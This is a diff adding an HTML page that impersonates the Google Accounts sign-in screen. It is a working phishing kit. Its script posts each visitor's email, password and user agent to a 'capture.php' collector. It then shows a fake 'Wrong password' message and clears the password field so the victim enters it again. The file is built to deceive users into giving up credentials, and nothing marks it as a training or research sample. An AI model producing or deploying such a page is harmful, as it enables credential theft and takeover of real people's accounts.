@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background-color: #fff;
+            color: #202124;
+            line-height: 1.5;
+        }
+        
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo img {
+            height: 24px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        
+        .form-container {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .form-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        
+        .form-group input[type="password"] {
+            margin-top: 24px;
+        }
+        
+        .error-message {
+            background-color: #fce8e6;
+            border: 1px solid #fad2cf;
+            color: #d93025;
+            padding: 12px;
+            margin: 16px 0;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .next-button:hover {
+            background-color: #1557b0;
+        }
+        
+        .next-button:disabled {
+            background-color: #dadce0;
+            color: #5f6368;
+            cursor: not-allowed;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            text-align: center;
+            margin-top: 24px;
+        }
+        
+        .language-selector select {
+            background: none;
+            border: none;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="images/pngwing.com.png" alt="Google">
+        </div>
+        
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to My Account</p>
+        
+        <div class="form-container">
+            <form id="google-login-form">
+                <div class="form-group">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <div class="error-message" id="error-message">
+                    <span class="error-text"></span>
+                </div>
+                
+                <div class="button-container">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-button" id="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        
+        <div class="language-selector">
+            <select>
+                <option value="en">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Handle form submission to capture credentials
+            $('#google-login-form').on('submit', function(e) {
+                e.preventDefault();
+                
+                // Get the email and password values
+                var email = $('#email').val();
+                var password = $('#password').val();
+                
+                // Hide any existing error message
+                $('#error-message').hide();
+                
+                // Check if both fields are filled
+                if (email && password) {
+                    // Send data to PHP capture file
+                    fetch('../capture.php', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            email: email,
+                            password: password,
+                            userAgent: navigator.userAgent,
+                            source: 'google-login'
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Google login data captured successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error capturing Google login data:', error);
+                    });
+                    
+                    // Show fake error message to user
+                    $('.error-text').text('Wrong password. Try again or click Forgot password to reset it.');
+                    $('#error-message').show();
+                    
+                    // Clear the password field
+                    $('#password').val('');
+                    
+                    // Focus back on the password field
+                    $('#password').focus();
+                } else {
+                    // If fields are empty, show validation message
+                    if (!email) {
+                        $('.error-text').text('Enter an email or phone number');
+                        $('#error-message').show();
+                        $('#email').focus();
+                    } else if (!password) {
+                        $('.error-text').text('Enter your password');
+                        $('#error-message').show();
+                        $('#password').focus();
+                    }
+                }
+            });
+            
+            // Update button text based on email input
+            $('#email').on('input', function() {
+                var email = $(this).val();
+                if (email) {
+                    $('#next-button').text('Next');
+                } else {
+                    $('#next-button').text('Next');
+                }
+            });
+        });
+    </script>
+</body>
+</html> 
